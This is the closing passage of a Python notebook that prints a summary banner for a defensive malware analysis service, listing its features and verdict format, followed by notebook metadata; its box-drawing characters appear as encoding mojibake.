    "â• â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•£\n",
    "â•‘  â€¢ File metadata (size, type, hashes)                                â•‘\n",
    "â•‘  â€¢ Entropy metrics (header, body, footer, overall)                   â•‘\n",
    "â•‘  â€¢ PE structure (sections, imports, exports, timestamps)             â•‘\n",
    "â•‘  â€¢ String analysis (URLs, IPs, registry, suspicious patterns)        â•‘\n",
    "â•‘  â€¢ Behavioral indicators (API calls, packing, obfuscation)           â•‘\n",
    "â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£\n",
    "â•‘                    OUTPUT FORMAT                                     â•‘\n",
    "â• â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•£\n",
    "â•‘  â€¢ Verdict: clean/potentially_unwanted/suspicious/malicious          â•‘\n",
    "â•‘  â€¢ Threat Score: 0-100                                               â•‘\n",
    "â•‘  â€¢ Confidence: 0-100%                                                â•‘\n",
    "â•‘  â€¢ Risk Factors: List of detected threats                            â•‘\n",
    "â•‘  â€¢ Recommendations: Security guidance                                â•‘\n",
    "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n",
    "\"\"\")\n",
    "\n",
    "print(\"\\nâœ… Malware Analysis Service is ready for deployment!\")\n",
    "print(\"ðŸ“ Model files saved to: ./models/\")\n",
    "print(\"ðŸ“– See README.md for integration instructions\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "env",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
